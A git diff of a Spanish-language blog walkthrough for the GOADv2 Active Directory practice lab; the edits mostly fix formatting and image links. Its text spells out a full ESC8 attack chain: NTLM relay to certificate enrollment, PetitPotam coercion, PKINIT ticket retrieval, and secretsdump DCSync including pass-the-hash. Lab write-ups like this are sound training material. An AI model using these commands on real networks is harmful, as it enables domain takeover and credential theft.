@@ -40,10 +40,10 @@ Un agradecimiento a [M4yFly](https://twitter.com/M4yFly){:target="_blank"} por c
     1. [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac)
     2. [PrintNightmare Windows Server 2016](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2016)
     3. [PrintNightmare Windows Server 2019](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2019)
-9. [ADCS (Active Directory Certificate Services)](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-    1. **[ESC8 - coerce to domain admin](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
-    2. **[ESC8 - with certipy](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
-    3. **[ADCS enumeración con certipy y bloodhound](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
+9. [ADCS - Active Directory Certificate Services](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-active-directory-certificate-services)
+    1. [ESC8 - coerce to domain admin](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---coerce-to-domain-admin)
+    2. [ESC8 - with certipy](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---with-certipy)
+    3. [ADCS enumeración con certipy y bloodhound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-enumeraci%C3%B3n-con-certipy-y-bloodhound)
     
 ---
 
@@ -2938,17 +2938,17 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] gre
 ```
 
 
-# **ADCS (Active Directory Certificate Services)**
+# ADCS (Active Directory Certificate Services)
 
-## **ESC8 - coerce to domain admin**
+## ESC8 - coerce to domain admin
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%206.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2022.png)
 
-Comprobar si la inscripción por Internet funciona en: [**http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp)** y ver que pide autenticación, así que se puede probar el ataque.
+Comprobar si la inscripción por Internet funciona en: [http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp) y ver que pide autenticación, así que se puede probar el ataque.
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%207.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2023.png)
 
-Ponerse a la escucha con ntlmrelay utilizando el comando:`**ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController**`
+Ponerse a la escucha con ntlmrelay utilizando el comando:`ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -2975,7 +2975,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Servers started, waiting for connections
 ```
 
-Por otra parte, se ejecuta el [**petitpotam**](https://github.com/topotam/PetitPotam) utilizando el comando: **`PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”**
+Por otra parte, se ejecuta el [petitpotam](https://github.com/topotam/PetitPotam) utilizando el comando: `PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody]
@@ -3092,7 +3092,7 @@ En este punto, se procede a guardar el certificado en un archivo que puede nombr
 ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Se solicitará un TGT utilizando la herramienta [**gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)** Esto se realizará con el siguiente comando: **`gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`**
+Se solicitará un TGT utilizando la herramienta [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) Esto se realizará con el siguiente comando: `gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`
 
 ```csharp
 ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3120,14 +3120,14 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx  1,4k angussmoody 26 ago 19:53  meereen.ccache
 ```
 
-Luego, procedemos a exportar el ticket utilizando el comando **`export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`**
+Luego, procedemos a exportar el ticket utilizando el comando `export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
 └──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
 ```
 
-Con los pasos anteriores completados, se procede a ejecutar el DCsync mediante el siguiente comando:**`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`**
+Con los pasos anteriores completados, se procede a ejecutar el DCsync mediante el siguiente comando:`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3187,9 +3187,9 @@ SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
 
 ---
 
-## **ESC8 - with certipy**
+## ESC8 - con certipy
 
-En primer lugar, se instala la herramienta [**certipy**](https://github.com/ly4k/Certipy) utilizando el comando: **`pip3 install certipy-ad`**
+En primer lugar, se instala la herramienta [certipy](https://github.com/ly4k/Certipy) utilizando el comando: `pip3 install certipy-ad`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3287,7 +3287,7 @@ Message: '[present-rich] %s'
 Arguments: (UpgradePrompt(old='22.2.2', new='23.2.1'),)
 ```
 
-Una vez instalada, la herramienta Certipy se ejecuta con el siguiente comando:**`certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController`** Luego, la herramienta quedará en espera de actividad.
+Una vez instalada, la herramienta Certipy se ejecuta con el siguiente comando:`certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController` Luego, la herramienta quedará en espera de actividad.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3298,7 +3298,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Listening on 0.0.0.0:445
 ```
 
-Una vez que Certipy está en espera, ejecutamos la herramienta PetitPotam con el comando:**`PetitPotam.py 192.168.56.104 meereen.essos.local`** para llevar a cabo la coerción de autenticación.
+Una vez que Certipy está en espera, ejecutamos la herramienta PetitPotam con el comando:`PetitPotam.py 192.168.56.104 meereen.essos.local` para llevar a cabo la coerción de autenticación.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody]
@@ -3348,7 +3348,7 @@ ESSOS\MEEREEN$
 [*] Exiting...
 ```
 
-Utilizando el archivo PFX generado, ahora procedemos a crear un ticket con la misma herramienta Certipy. Ejecutamos el siguiente comando: **`certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12`**
+Utilizando el archivo PFX generado, ahora procedemos a crear un ticket con la misma herramienta Certipy. Ejecutamos el siguiente comando: `certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3372,14 +3372,14 @@ Permissions Size User        Date Modified Name
 .rwxrwxrwx  1,4k angussmoody 28 ago 21:17  meereen.ccache
 ```
 
-A continuación, exportaremos el ticket utilizando el comando: **`export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`**
+A continuación, exportaremos el ticket utilizando el comando: `export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
 └──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
 ```
 
-Una vez que se haya exportado el ticket, se ejecuta el ataque DCsync con el comando:**`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`**
+Una vez que se haya exportado el ticket, se ejecuta el ataque DCsync con el comando:`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`
 
 ```csharp
 ┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3437,7 +3437,7 @@ SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
 [*] Cleaning up...
 ```
 
-También puedes llevar a cabo el ataque DCsync utilizando el comando:  **`secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`** En este caso, se utiliza el hash proporcionado por la herramienta Certipy.
+También puedes llevar a cabo el ataque DCsync utilizando el comando:  `secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local` En este caso, se utiliza el hash proporcionado por la herramienta Certipy.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3497,9 +3497,9 @@ SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
 
 ---
 
-## **ADCS enumeración con certipy y bloodhound**
+## ADCS enumeración con certipy y bloodhound
 
-Utilizando la herramienta [**certipy**](https://github.com/ly4k/Certipy) para realizar una enumeración de las ADCS, para esto ejecutamos el comando **`certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`** Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.
+Utilizando la herramienta [certipy](https://github.com/ly4k/Certipy) para realizar una enumeración de las ADCS, para esto ejecutamos el comando `certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12` Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3518,7 +3518,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '20230829200454_Certipy.json'
 ```
 
-También es posible utilizar la bandera para mostrar las plantillas vulnerables. En ese caso, se puede ejecutar el comando: **`certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout`**
+También es posible utilizar la bandera para mostrar las plantillas vulnerables. En ese caso, se puede ejecutar el comando:  `certipy find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -3730,24 +3730,24 @@ Certificate Templates
 
 Se puede observar información que indica que ESC1 y ESC2 son vulnerables, entre otros.
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%208.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2024.png)
 
-Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k **[ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases)** ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [**BloodHound**](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
+Siguiendo el proceso, se procede a cargar el archivo ZIP en BloodHound. Para llevar a cabo esta tarea, se debe utilizar una versión modificada de BloodHound proporcionada por ly4k [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases) ly se inicia BloodHound de la misma manera que se hizo en sesiones anteriores. [BloodHound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#bloodhound)
 
-Iniciando el proceso, se inicia el Neo4j, el cual debe ser una versión superior a 4.0.0. Posteriormente, BloodHound se inicia con el comando **`./BloodHound --no-sandbox`Una vez que BloodHound se inicia, se procede a cargar el archivo ZIP siguiendo el mismo procedimiento que se realizó en sesiones anteriores.** 
+Iniciando el proceso, se inicia el Neo4j, el cual debe ser una versión superior a 4.0.0. Posteriormente, BloodHound se inicia con el comando `./BloodHound --no-sandbox`Una vez que BloodHound se inicia, se procede a cargar el archivo ZIP siguiendo el mismo procedimiento que se realizó en sesiones anteriores. 
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%209.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2025.png)
 
 Una vez cargado, BloodHound mostrará estos archivos en la interfaz para su análisis y exploración. 
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2010.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2026.png)
 
 Para continuar, se busca la opción "PKI" en la pestaña de Análisis y se hace clic en "Find Certificate Authorities".
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2011.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2027.png)
 
 Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de Node Info. y se hace clic en "See Enabled Templates".
 
-![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%2012.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2028.png)
 
 ---
